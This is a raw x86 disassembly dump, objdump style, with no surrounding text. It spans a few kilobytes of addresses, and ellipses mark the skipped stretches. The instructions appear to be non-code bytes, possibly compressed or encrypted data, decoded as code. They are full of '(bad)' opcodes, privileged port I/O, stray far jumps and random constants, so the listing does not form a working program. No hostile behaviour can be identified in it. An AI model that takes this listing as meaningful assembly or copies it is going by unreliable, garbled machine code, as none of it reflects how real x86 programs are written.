  424f4a:	fsubr  st(2),st
  424f4c:	ffree  st(5)
  424f4e:	xchg   ebp,eax
  424f4f:	fstp   TBYTE PTR [ecx-0x5e]
  424f52:	outs   dx,DWORD PTR ds:[esi]
  424f53:	shl    DWORD PTR [edi-0x16],1
  424f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f57:	cli    
  424f58:	jge    0x424f92
  424f5a:	pop    ebp
  424f5b:	enter  0xec9,0x3b
  424f5f:	mov    esi,0xfa32804
  424f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f65:	mov    dl,0x7a
  424f67:	test   eax,0xf5651699
  424f6c:	jl     0x424faa
  424f6e:	shl    BYTE PTR [edi-0x47],cl
  424f71:	xchg   edx,eax
  424f72:	fild   QWORD PTR [edx-0x3]
  424f75:	out    dx,eax
  424f76:	cmp    ebx,DWORD PTR [eax]
  424f78:	mov    al,0xff
  424f7a:	adc    ah,bl
  424f7c:	mov    esi,DWORD PTR [edi+0x1e]
  424f7f:	dec    esp
  424f80:	je     0x424fd8
  424f82:	inc    edi
  424f83:	inc    esp
  424f84:	push   ebp
  424f85:	and    eax,0x499e6143
  424f8a:	std    
  424f8b:	fld    TBYTE PTR [edx]
  424f8d:	les    esp,FWORD PTR [esi+0x3c]
	...
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	dec    edx
  425001:	mov    edi,0x8ab46b10
  425006:	add    DWORD PTR [eax],eax
  425008:	add    al,0x1
  42500a:	add    BYTE PTR [eax],al
  42500c:	sar    DWORD PTR [ebx],0x5c
  42500f:	inc    edi
  425010:	xchg   edi,eax
  425011:	sbb    BYTE PTR [ecx+0x60],cl
  425014:	mov    ah,0x6f
  425016:	inc    esi
  425017:	ja     0x424fd5
  425019:	sub    ebp,DWORD PTR [esi-0x1f]
  42501c:	jecxz  0x424fb8
  42501e:	lock sahf 
  425020:	(bad)  
  425021:	shl    edx,1
  425023:	xchg   ebx,eax
  425024:	fimul  DWORD PTR [ecx+0x53]
  425027:	mov    bl,0xd3
  425029:	pop    ecx
  42502a:	cmp    al,0x39
  42502c:	out    0xe3,al
  42502e:	call   0x79da:0xdc3efa4d
  425035:	jne    0x425090
  425037:	xchg   BYTE PTR [ebx+0x46648a96],cl
  42503d:	bound  edx,QWORD PTR [edi+0x69fbb03e]
  425043:	hlt    
  425044:	jbe    0x424fed
  425046:	dec    ebp
  425047:	and    edx,DWORD PTR [ecx+0x3437f05b]
  42504d:	in     eax,dx
  42504e:	sbb    DWORD PTR [eax],0x4cf76092
  425054:	dec    ebp
  425055:	cld    
  425056:	cmp    dh,bh
  425058:	gs inc bl
  42505b:	inc    eax
  42505c:	shl    cl,0x2d
  42505f:	inc    esp
  425060:	push   eax
  425061:	test   dl,al
  425063:	sub    ch,dl
  425065:	int    0xd8
  425067:	lock cld 
  425069:	sub    eax,0xd5c4cc40
  42506e:	xor    BYTE PTR [esp+eax*1-0x6e],dl
  425072:	pop    DWORD PTR ds:0xf080e91d
  425078:	dec    esi
  425079:	sbb    DWORD PTR [ebx+0x7d134b10],edx
  42507f:	add    BYTE PTR [esi],bh
  425081:	clc    
  425082:	xchg   edi,eax
  425083:	adc    ah,BYTE PTR [ebx]
  425085:	pop    es
  425086:	push   ebp
  425087:	test   DWORD PTR [esi],edx
  425089:	push   ds
  42508a:	dec    esp
  42508b:	jp     0x4250b0
  42508d:	outs   dx,BYTE PTR ds:[esi]
  42508e:	add    al,0xc3
  425090:	stos   BYTE PTR es:[edi],al
  425091:	les    esp,FWORD PTR [ecx+0x36]
  425094:	xchg   BYTE PTR [edx+0x64],ch
  425097:	sub    eax,0x1dafe213
  42509c:	xor    al,0xa5
  42509e:	add    ecx,DWORD PTR [ebp-0x2529ca01]
  4250a4:	jns    0x425092
  4250a6:	daa    
  4250a7:	cli    
  4250a8:	ds mov edi,ss
  4250ab:	imul   ecx,DWORD PTR [ecx+0x3b44afa2],0xffffffbd
  4250b2:	mov    ah,al
  4250b4:	sbb    ebp,0x641aeb40
  4250ba:	dec    ebx
  4250bb:	add    ecx,DWORD PTR [ebx]
  4250bd:	out    dx,al
  4250be:	sti    
  4250bf:	fxch   st(0)
  4250c1:	dec    ecx
  4250c2:	(bad)  
  4250c3:	pop    ds
  4250c4:	xor    BYTE PTR [esi],cl
  4250c6:	sbb    al,0xd3
  4250c8:	mov    BYTE PTR [esi-0x60],dl
  4250cb:	mov    ds:0x42dc1f0b,al
  4250d0:	add    DWORD PTR [ebx],ebx
  4250d2:	ss pop ebp
  4250d4:	cwde   
  4250d5:	jae    0x425077
  4250d7:	aad    0x3a
  4250d9:	sub    bl,BYTE PTR [ecx+0x16]
  4250dc:	in     al,dx
  4250dd:	sub    esp,DWORD PTR [edx-0x34]
  4250e0:	jbe    0x425097
  4250e2:	in     al,dx
  4250e3:	sub    al,0x7c
  4250e5:	retf   0x7a60
  4250e8:	fstp   QWORD PTR [eax+0xf]
  4250eb:	pop    esp
  4250ec:	jnp    0x42513c
  4250ee:	adc    BYTE PTR [esi],al
  4250f0:	mov    ds:0xffabfa36,eax
  4250f5:	loopne 0x4250ad
  4250f7:	cmp    eax,0xfa2570f8
  4250fc:	aas    
  4250fd:	add    edi,0xffffff9f
  425100:	pop    edx
  425101:	mov    eax,0x5997b75d
  425106:	int3   
  425107:	ss (bad) 
  425109:	push   eax
  42510a:	inc    BYTE PTR [ecx+0x3d2f0e4]
	...
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x14a4:0x964092e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    dh,cl
  42518d:	pop    ss
  42518e:	mov    bl,0x4d
  425190:	mov    esi,0x63f40481
  425195:	pop    ebx
  425196:	outs   dx,DWORD PTR ds:[esi]
  425197:	push   ecx
  425198:	lea    eax,[ebp-0x27]
  42519b:	fmul   st,st(3)
  42519d:	shl    BYTE PTR [ebp+ebx*4+0x17],0xa0
  4251a2:	lds    esp,FWORD PTR [eax+0x605bec54]
  4251a8:	dec    esp
  4251a9:	jmp    0xacc7:0x7030dbdf
  4251b0:	aaa    
  4251b1:	xchg   cl,dl
  4251b3:	push   ds
  4251b4:	pusha  
  4251b5:	imul   ebx,ebx,0xffffffe9
  4251b8:	or     dl,dl
  4251ba:	or     al,0x4e
  4251bc:	sysexit 
  4251be:	mov    DWORD PTR [eax+0x7699b01f],ecx
  4251c4:	xchg   edx,eax
  4251c5:	jbe    0x4251fb
  4251c7:	leave  
  4251c8:	shl    BYTE PTR [esp+eiz*2-0x72],cl
  4251cc:	jne    0x4251c9
  4251ce:	int    0x3c
  4251d0:	ret    
  4251d1:	scas   eax,DWORD PTR es:[edi]
  4251d2:	sub    cl,BYTE PTR [ebx-0x2d]
  4251d5:	jmp    0x425196
  4251d7:	sbb    eax,0x1ea28e52
  4251dc:	inc    esi
  4251dd:	fist   WORD PTR [esi]
  4251df:	xchg   esp,edx
  4251e1:	inc    ebp
  4251e2:	ret    0xe6d4
  4251e5:	fadd   st(1),st
  4251e7:	fistp  QWORD PTR [edx+edx*8-0x6c]
  4251eb:	sbb    edx,DWORD PTR [edx]
  4251ed:	adc    eax,0xb6259ffc
  4251f2:	pop    ss
  4251f3:	lock je 0x42526a
  4251f6:	push   edi
  4251f7:	xlat   BYTE PTR ds:[ebx]
  4251f8:	xor    dl,BYTE PTR [ebx+0x3fd9f135]
  4251fe:	(bad)  
  425200:	ficom  WORD PTR [eax+0x4a]
  425203:	dec    eax
  425204:	adc    DWORD PTR [eax+0x38ecd088],ebp
  42520a:	add    BYTE PTR [ecx+0x63f09002],al
  425210:	adc    DWORD PTR [ecx],edx
  425212:	popa   
  425213:	out    dx,eax
  425214:	jnp    0x42527f
  425216:	mov    cl,BYTE PTR [ebx]
  425218:	jno    0x42527f
  42521a:	push   ebx
  42521b:	cdq    
  42521c:	sbb    BYTE PTR [eax+esi*4],cl
  42521f:	push   0x247e953b
  425224:	xor    ch,BYTE PTR [ebp-0x3f]
  425227:	and    DWORD PTR [edi-0x45aac021],0x5b563fa
  425231:	aaa    
  425232:	mov    esp,0xfadf193a
  425237:	dec    ebp
  425238:	mov    ch,0x0
  42523a:	test   DWORD PTR [edi-0x66],esi
  42523d:	mov    eax,ds:0x32ba3f2a
  425242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425243:	cmp    BYTE PTR [edi+eiz*4+0x4633ef76],ah
  42524a:	add    edi,DWORD PTR [ebx]
  42524c:	sub    DWORD PTR [ebp-0xce7e71b],0xffffffe5
  425253:	mov    dh,0xac
  425255:	inc    eax
  425256:	adc    BYTE PTR [ecx],ch
  425258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425259:	jmp    0x9425859c
  42525e:	js     0x4252d6
  425260:	and    ah,BYTE PTR [eax+0x4adb430b]
  425266:	sbb    bh,BYTE PTR [ecx+0x36]
  425269:	test   ecx,eax
  42526b:	fsub   DWORD PTR [eax+0x6bde0217]
  425271:	sub    BYTE PTR [eax],ah
  425273:	or     DWORD PTR [eax+0x4d09cfdf],edi
  425279:	out    0x12,eax
  42527b:	clc    
  42527c:	and    eax,0xf5a75ed0
  425281:	or     ebp,DWORD PTR [ebx-0x5f635183]
  425287:	mov    bh,0x6
  425289:	sub    al,0xf9
  42528b:	lahf   
  42528c:	jae    0x425222
  42528e:	adc    dh,bl
	...
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	nop
  425301:	push   0x8cbc53a6
  425306:	add    DWORD PTR [eax],eax
  425308:	add    al,0x1
  42530a:	add    BYTE PTR [eax],al
  42530c:	inc    BYTE PTR [esi+0x3a43647a]
  425312:	push   eax
  425313:	pop    edx
  425314:	xchg   ecx,eax
  425315:	adc    ecx,DWORD PTR [ecx]
  425317:	mov    ebp,0xe15dd044
  42531c:	stos   BYTE PTR es:[edi],al
  42531d:	popf   
  42531e:	ror    DWORD PTR [ebx],0x24
  425321:	scas   eax,DWORD PTR es:[edi]
  425322:	retf   0xb6b5
  425325:	xchg   ebx,eax
  425326:	mov    edx,0x4588a613
  42532b:	jnp    0x4252cd
  42532d:	xor    dh,bh
  42532f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425330:	cld    
  425331:	in     al,dx
  425332:	jbe    0x4252ea
  425334:	and    bh,BYTE PTR ds:[eax+0x735c516b]
  42533b:	sahf   
  42533c:	xor    al,0x18
  42533e:	imul   ebp,DWORD PTR [edi],0x63
  425341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425342:	shl    BYTE PTR [ebp+0x3d36d415],1
  425348:	dec    edi
  425349:	sbb    al,0x7d
  42534b:	adc    al,0x4
  42534d:	scas   eax,DWORD PTR es:[edi]
  42534e:	mov    ecx,esp
  425350:	lock pop ds
  425352:	or     al,0xa3
  425354:	xlat   BYTE PTR ds:[ebx]
  425355:	sbb    eax,0xd68394ba
  42535a:	xchg   esp,eax
  42535b:	jne    0x42537f
  42535d:	dec    edx
  42535e:	unpckhps xmm4,XMMWORD PTR [ecx+0x2e]
  425362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425363:	jl     0x42532d
  425365:	mov    esi,0xd993535a
  42536a:	and    al,BYTE PTR [edx-0x2f563c1]
  425370:	int    0x96
  425372:	mov    al,BYTE PTR [edi]
  425374:	(bad)  
  425375:	fidivr DWORD PTR [edi+0x7719aa81]
  42537b:	iret   
  42537c:	xor    eax,0x8db458d
  425381:	and    eax,0xb891339c
  425386:	fdivrp st(3),st
  425388:	jb     0x425391
  42538a:	fisubr WORD PTR [ebx+0x78f2713b]
  425390:	nop
  425391:	jle    0x4253d8
  425393:	mov    cl,0x51
  425395:	pushf  
  425396:	shr    DWORD PTR [ebp-0x4e],1
  425399:	jl     0x425395
  42539b:	idiv   BYTE PTR [ecx+0x1e99d53e]
  4253a1:	hlt    
  4253a2:	data16 stc 
  4253a4:	fild   WORD PTR ds:0xea42d129
  4253aa:	xor    al,0xb6
  4253ac:	lea    edx,ds:0x2acf5f1d
  4253b2:	clc    
  4253b3:	mov    ebx,0xd804d563
  4253b8:	xlat   BYTE PTR ds:[ebx]
  4253b9:	scas   eax,DWORD PTR es:[edi]
  4253ba:	int    0x12
  4253bc:	scas   al,BYTE PTR es:[edi]
  4253bd:	jl     0x425405
  4253bf:	or     dh,0x1
  4253c2:	js     0x425347
  4253c4:	scas   al,BYTE PTR es:[edi]
  4253c5:	in     al,dx
  4253c6:	or     ch,BYTE PTR fs:[ecx-0x25a6811d]
  4253cd:	jl     0x4253cd
  4253cf:	repnz fild DWORD PTR [ebx+ebp*2]
  4253d3:	es mov dh,0xbe
  4253d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253d7:	and    eax,0xc11beb88
  4253dc:	dec    edx
  4253dd:	lods   eax,DWORD PTR ds:[esi]
  4253de:	mov    ebx,0xb465213e
  4253e3:	mov    edi,edx
  4253e5:	push   ebp
  4253e6:	cld    
  4253e7:	push   0xffffffd8
  4253e9:	(bad)  
  4253ea:	leave  
  4253eb:	mov    BYTE PTR [eax-0x6ac086e7],dl
  4253f1:	daa    
  4253f2:	adc    eax,0x56d0a59a
  4253f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253f8:	ror    BYTE PTR [edi],0xf0
  4253fb:	scas   al,BYTE PTR es:[edi]
  4253fc:	(bad)  
  4253fd:	mov    ss,WORD PTR [edi+0x3274b075]
  425403:	(bad)  
  425404:	xor    BYTE PTR [eax-0x71],al
  425407:	add    DWORD PTR [ecx-0x72],ecx
  42540a:	or     edx,eax
  42540c:	fwait
  42540d:	ss sti 
  42540f:	inc    ecx
	...
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    eax,DWORD PTR [edx-0x11]
  425482:	cmp    DWORD PTR [ecx],edi
  425484:	ror    BYTE PTR [ebp+0x1040001],0x0
  42548b:	add    BYTE PTR [edx-0x54],bh
  42548e:	mov    ebx,0x2ead5e2a
  425494:	xchg   ebx,eax
  425495:	ret    
  425496:	sub    DWORD PTR [edx+0x61ab50f7],esi
  42549c:	(bad)  
  42549d:	cmc    
  42549e:	add    bl,BYTE PTR [ecx-0x6cb9872d]
  4254a4:	jecxz  0x4254bd
  4254a6:	cmp    al,dl
  4254a8:	es adc al,0x65
  4254ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254ac:	ja     0x4254db
  4254ae:	add    DWORD PTR [ecx],0x10
  4254b1:	push   ds
  4254b2:	mov    ebx,0x949daeac
  4254b7:	pop    ds
  4254b8:	inc    edx
  4254b9:	repz retf 
  4254bb:	adc    ebp,ecx
  4254bd:	push   0x10
  4254bf:	pop    esi
  4254c0:	sbb    eax,0x5933d96d
  4254c5:	and    bh,BYTE PTR [ebp+0x3cb5c4fe]
  4254cb:	pop    ds
  4254cc:	add    BYTE PTR [eiz*4-0x3d2c8bb5],al
  4254d3:	sbb    al,0x72
  4254d5:	mov    dl,0xa9
  4254d7:	inc    ecx
  4254d8:	push   edi
  4254d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254da:	dec    ebx
  4254db:	gs jmp 0x4254a3
  4254de:	mov    bl,0xe0
  4254e0:	adc    eax,DWORD PTR [eax-0xef1fbaf]
  4254e6:	cmp    eax,0x8bbd3d15
  4254eb:	push   ss
  4254ec:	into   
  4254ed:	(bad)  
  4254ee:	fiadd  WORD PTR [edx+0x40]
  4254f1:	es scas eax,DWORD PTR es:[edi]
  4254f3:	jecxz  0x425489
  4254f5:	xor    al,0x7d
  4254f7:	xchg   esp,eax
  4254f8:	sar    BYTE PTR [edi-0x2a],cl
  4254fb:	fwait
  4254fc:	comiss xmm3,DWORD PTR [esi]
  4254ff:	push   esp
  425500:	aas    
  425501:	loop   0x42548d
  425503:	arpl   WORD PTR [esi+0x70],cx
  425506:	call   0x4fba:0x50f15b62
  42550d:	sbb    al,0x1a
  42550f:	outs   dx,DWORD PTR ds:[esi]
  425510:	jecxz  0x42556f
  425512:	pop    edi
  425513:	cmp    BYTE PTR [ecx-0x6d],0xba
  425517:	cmp    eax,0x5947506d
  42551c:	push   edi
  42551d:	sub    al,0x4
  42551f:	ror    DWORD PTR [edi-0x5a],1
  425522:	std    
  425523:	addr16 jnp 0x425544
  425526:	jns    0x4254bd
  425528:	sbb    ebx,DWORD PTR [edi-0x3e82658e]
  42552e:	retf   
  42552f:	add    DWORD PTR [edi+esi*1+0x1f],ebx
  425533:	aas    
  425534:	retf   
  425535:	(bad)  
  425536:	mov    ah,0xf2
  425538:	and    bh,BYTE PTR [esi]
  42553a:	mov    DWORD PTR [edi+0x72ca66a4],esi
  425540:	ins    BYTE PTR es:[edi],dx
  425541:	xchg   ebp,eax
  425542:	addr16 std 
  425544:	pop    edx
  425545:	jge    0x425540
  425547:	xor    ebx,edx
  425549:	pop    edi
  42554a:	adc    esi,DWORD PTR [edx+0x5b100a3d]
  425550:	ror    edx,cl
  425552:	mov    esi,0x5f89b559
  425557:	push   eax
  425558:	aaa    
  425559:	mov    ah,0x89
  42555b:	inc    edi
  42555c:	popa   
  42555d:	std    
  42555e:	test   bh,bl
  425560:	(bad)  
  425562:	sti    
  425563:	iret   
  425564:	(bad)  
  425565:	pop    ss
  425566:	shl    BYTE PTR [ebx+0x6e],1
  425569:	mov    bl,dh
  42556b:	adc    cl,BYTE PTR [edi+0xbfae111]
  425571:	and    DWORD PTR [ebx-0x77],esi
  425574:	jns    0x425505
  425576:	(bad)  
  425577:	std    
  425578:	repnz sub BYTE PTR [ebp+0x2],ah
  42557c:	imul   edi,ebx,0xe6eb9bb7
  425582:	jno    0x42554d
  425584:	sbb    dh,BYTE PTR [edx]
  425586:	std    
  425587:	push   eax
  425588:	in     eax,dx
  425589:	xor    eax,0x1d57b180
  42558e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42558f:	les    eax,FWORD PTR [eax]
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x18faf13a
  425602:	sub    eax,0x18ec430
  425607:	add    BYTE PTR [ecx+eax*1],al
  42560a:	add    BYTE PTR [eax],al
  42560c:	sbb    BYTE PTR [ebp-0x3a],bh
  42560f:	es fmul st(0),st
  425612:	imul   edx,edi,0x2c78b91
  425618:	test   al,0x5
  42561a:	add    eax,0xe69d5aa7
  42561f:	test   bh,ah
  425621:	jg     0x42564f
  425623:	test   BYTE PTR [ebx-0x4f],al
  425626:	dec    edx
  425627:	lock in eax,dx
  425629:	fmul   QWORD PTR [eax-0x6232e0fa]
  42562f:	dec    eax
  425631:	jb     0x425691
  425633:	add    ebp,DWORD PTR [eax]
  425635:	xchg   ebp,eax
  425636:	sbb    DWORD PTR [ecx-0x341e3849],eax
  42563c:	mov    ebp,0x31490920
  425641:	pusha  
  425642:	xor    BYTE PTR ds:0x8c566319,dh
  425648:	add    ebx,0x9f28423f
  42564e:	jae    0x425644
  425650:	aad    0x6a
  425652:	cwde   
  425653:	shl    edx,0x25
  425656:	mov    esi,0xd4c0c34a
  42565b:	(bad)  
  42565c:	rcl    DWORD PTR [ecx],1
  42565e:	add    eax,0xe6914611
  425663:	and    bl,BYTE PTR [ecx+0x77]
  425666:	aaa    
  425667:	repnz cwde 
  425669:	xor    BYTE PTR [ecx],0xae
  42566c:	dec    esp
  42566d:	loop   0x42565d
  42566f:	push   ds
  425670:	je     0x425693
  425672:	mov    dl,0xcd
  425674:	jp     0x42567d
  425676:	mov    al,0xf0
  425678:	dec    esi
  425679:	shr    DWORD PTR [edi+0x426a806f],0x92
  425680:	inc    edx
  425681:	mov    ebp,0xc976fb00
  425686:	imul   esp,DWORD PTR [esi+0x69],0x1e885f12
  42568d:	cdq    
  42568e:	fcomp  st(2)
  425690:	ret    
  425691:	(bad)  [esi+0x4389841]
  425697:	and    BYTE PTR [ecx],ah
  425699:	sub    DWORD PTR [eax-0x2bb2dcb6],eax
  42569f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256a0:	cwde   
  4256a1:	xchg   ebp,eax
  4256a2:	mov    esi,0x18356805
  4256a7:	fidiv  DWORD PTR [ebx-0x3f]
  4256aa:	nop
  4256ab:	mov    edx,0xc7a23f60
  4256b0:	retf   0xdddd
  4256b3:	sub    eax,0x976ef5af
  4256b8:	sub    ebx,DWORD PTR [edi-0x5dbe34b2]
  4256be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256bf:	mov    esi,0x11a101b5
  4256c4:	xchg   edi,eax
  4256c5:	jp     0x425741
  4256c7:	and    bh,BYTE PTR [eax-0x3e7fb928]
  4256cd:	inc    ch
  4256cf:	stos   BYTE PTR es:[edi],al
  4256d0:	add    ch,BYTE PTR [ecx]
  4256d2:	xor    al,BYTE PTR [ecx-0x1040b1f0]
  4256d8:	cmp    ch,ah
  4256da:	loop   0x4256f8
  4256dc:	pop    ecx
  4256dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256de:	dec    edx
  4256df:	out    dx,al
  4256e0:	mov    bl,0xd4
  4256e2:	or     al,BYTE PTR [ecx-0x79]
  4256e5:	in     eax,0xd6
  4256e7:	ja     0x4256c1
  4256e9:	in     al,dx
  4256ea:	cmc    
  4256eb:	retf   
  4256ec:	call   0xfa8b:0xef9fe59c
  4256f3:	pop    ds
  4256f4:	scas   eax,DWORD PTR es:[edi]
  4256f5:	xchg   edx,eax
  4256f6:	or     eax,0x369c9e0
  4256fb:	and    eax,0xb493e9af
  425700:	push   es
  425701:	fidiv  WORD PTR [edx-0x20fe1c44]
  425708:	jmp    0x4256f7
  42570a:	add    BYTE PTR [eax-0x47],bl
  42570d:	aam    0x79
  42570f:	mov    al,0x0
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xbe8bcd74
  425783:	jg     0x42574d
  425785:	pop    DWORD PTR [ecx]
  425787:	add    BYTE PTR [ecx+eax*1],al
  42578a:	add    BYTE PTR [eax],al
  42578c:	xor    DWORD PTR [edx-0x49],ebx
  42578f:	rcl    DWORD PTR cs:[ebp-0x35ad1a6c],1
  425796:	imul   ebp,DWORD PTR [edx],0xfffffffe
  425799:	xor    al,0x1f
  42579b:	mov    dh,0x6b
  42579d:	jb     0x425818
  42579f:	pusha  
  4257a0:	call   0x907a3218
  4257a5:	fs and eax,0x8a470f82
  4257ab:	out    dx,eax
  4257ac:	mov    ecx,ebp
  4257ae:	int3   
  4257af:	add    dh,al
  4257b1:	xor    BYTE PTR [edx-0x6fefd953],bh
  4257b7:	ins    BYTE PTR es:[edi],dx
  4257b8:	in     eax,dx
  4257b9:	cmp    esi,DWORD PTR [ebp+0x5bdb20b3]
  4257bf:	mov    ?,WORD PTR [edi]
  4257c1:	shl    DWORD PTR [ebp+0x503dbb90],1
  4257c7:	cld    
  4257c8:	jmp    0x425821
  4257ca:	pop    es
  4257cb:	(bad)  
  4257cc:	xlat   BYTE PTR ds:[ebx]
  4257cd:	mov    ebx,0x3f5a430a
  4257d2:	adc    eax,0xb385471b
  4257d7:	std    
  4257d8:	and    eax,DWORD PTR [ebx+0x51]
  4257db:	test   eax,0x83c3a30
  4257e0:	adc    al,0xff
  4257e2:	sub    ch,BYTE PTR [esp+edi*4+0x47]
  4257e6:	dec    ecx
  4257e7:	popa   
  4257e8:	ins    BYTE PTR es:[edi],dx
  4257e9:	shl    esp,cl
  4257eb:	call   0x3f0339b3
  4257f0:	cmp    DWORD PTR [ebx-0x3],0xf340a68b
  4257f7:	or     bl,bh
  4257f9:	xor    dl,BYTE PTR [ebx]
  4257fb:	xchg   edi,eax
  4257fc:	jmp    0xda6c:0xdf4c42ab
  425803:	adc    DWORD PTR [ebx+0x46],esp
  425806:	jp     0x425875
  425808:	inc    esi
  425809:	mov    ds:0xba2dd104,eax
  42580e:	into   
  42580f:	rcl    BYTE PTR [eax-0x359d81a0],0x23
  425816:	mov    ds:0x2f238c95,eax
  42581b:	pop    eax
  42581c:	inc    eax
  42581d:	lahf   
  42581e:	mov    al,ds:0xb9c6e6ee
  425823:	in     al,0xc0
  425825:	or     al,0xd6
  425827:	mov    ebp,0xef42ed80
  42582c:	scas   al,BYTE PTR es:[edi]
  42582d:	cmp    DWORD PTR [ebx],ecx
  42582f:	inc    edi
  425830:	mov    edi,0xd6a53837
  425835:	jnp    0x42583d
  425837:	popf   
  425838:	shl    BYTE PTR [ebx-0x2208c7db],cl
  42583e:	mov    ebp,0x13a2554a
  425843:	(bad)  
  425844:	dec    esi
  425845:	fs test eax,0x9e98f690
  42584b:	inc    esp
  42584c:	stos   DWORD PTR es:[edi],eax
  42584d:	xchg   esp,eax
  42584e:	fimul  WORD PTR [ebx-0x63]
  425851:	mov    cs,WORD PTR [esi-0x40]
  425854:	sub    ebp,DWORD PTR [ebp+0x1595cfd3]
  42585a:	sub    bl,BYTE PTR [ecx]
  42585c:	ins    DWORD PTR es:[edi],dx
  42585d:	pushf  
  42585e:	repz cli 
  425860:	lds    ecx,FWORD PTR [esi+0x63]
  425863:	push   ss
  425864:	fsubr  QWORD PTR [esi]
  425866:	fidiv  WORD PTR [ecx+0x64a487a2]
  42586c:	enter  0xa4c,0x50
  425870:	leave  
  425871:	xchg   ebx,eax
  425872:	div    BYTE PTR [eax-0x25]
  425875:	je     0x425858
  425877:	sub    al,bh
  425879:	mov    al,ds:0xfd44fb37
  42587e:	outs   dx,DWORD PTR ds:[esi]
  42587f:	adc    al,cl
  425881:	shl    BYTE PTR ds:0xc51a0fb5,0xe8
  425888:	xor    eax,0x8e1bfd23
  42588d:	mov    dl,0xd
	...
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	pop    esp
  425901:	mov    edi,0x90cc1647
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
  42590c:	xchg   edi,eax
  42590d:	into   
  42590e:	inc    ebp
  42590f:	add    BYTE PTR [esi+edx*2-0x34ae2d02],ch
  425916:	xchg   BYTE PTR [esi+0x3b],bl
  425919:	bound  esi,QWORD PTR [eax+ecx*2]
  42591c:	mov    bl,0x62
  42591e:	and    al,BYTE PTR [ecx+edx*2]
  425921:	cmp    esi,DWORD PTR [edx]
  425923:	add    DWORD PTR [ebx],esp
  425925:	cmp    edx,ebp
  425927:	xor    ebp,DWORD PTR [edi-0x57]
  42592a:	je     0x425918
  42592c:	fistp  WORD PTR [eax-0x32]
  42592f:	lods   al,BYTE PTR ds:[esi]
  425930:	fmul   QWORD PTR [ebp+0x5b6e161a]
  425936:	das    
  425937:	addr16 jo 0x4258c0
  42593a:	ins    BYTE PTR es:[edi],dx
  42593b:	xor    eax,0xdb5679a7
  425940:	mov    es,ecx
  425942:	xor    DWORD PTR [ebp-0x52b9ddff],esp
  425948:	xchg   ebp,eax
  425949:	and    BYTE PTR [ebx-0x2a376a31],cl
  42594f:	pop    ds
  425950:	xor    al,0x3f
  425952:	push   ecx
  425953:	jmp    0xd91aebf2
  425958:	inc    ebx
  425959:	xchg   DWORD PTR [edi+0x5e],eax
  42595c:	cmc    
  42595d:	mov    ah,0x16
  42595f:	lahf   
  425960:	lods   eax,DWORD PTR ds:[esi]
  425961:	add    eax,0x2faebcb1
  425966:	imul   eax,DWORD PTR ds:0x592d9af6,0xdf8bfed3
  425970:	mov    ebx,0x6f8abf87
  425975:	es dec ecx
  425977:	frstor [eax]
  425979:	out    dx,al
  42597a:	adc    DWORD PTR [eax-0xb],ebx
  42597d:	es jne 0x425997
  425980:	outs   dx,BYTE PTR ds:[esi]
  425981:	mov    eax,ds:0xe2f71a27
  425986:	pusha  
  425987:	xchg   ebp,eax
  425988:	cmp    eax,0xa24b0207
  42598d:	repnz push ds
  42598f:	in     eax,0x38
  425991:	ss push ecx
  425993:	jmp    0x4259e2
  425995:	sbb    DWORD PTR [esi-0x17d832d4],0x1d0289d4
  42599f:	sbb    dl,bl
  4259a1:	ja     0x4259f8
  4259a3:	sbb    BYTE PTR [edx-0x21],cl
  4259a6:	clc    
  4259a7:	pop    ds
  4259a8:	push   edx
  4259a9:	sub    BYTE PTR [esi],ch
  4259ab:	(bad)  
  4259ac:	jg     0x4259a9
  4259ae:	stos   BYTE PTR es:[edi],al
  4259af:	loope  0x425a0d
  4259b1:	sbb    BYTE PTR [edx],ah
  4259b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259b4:	fild   DWORD PTR [edx]
  4259b6:	fisubr WORD PTR [edi+0x433a385]
  4259bc:	in     eax,dx
  4259bd:	(bad)  
  4259be:	sbb    edi,eax
  4259c0:	inc    esp
  4259c1:	lds    ebx,FWORD PTR [edi+0x50]
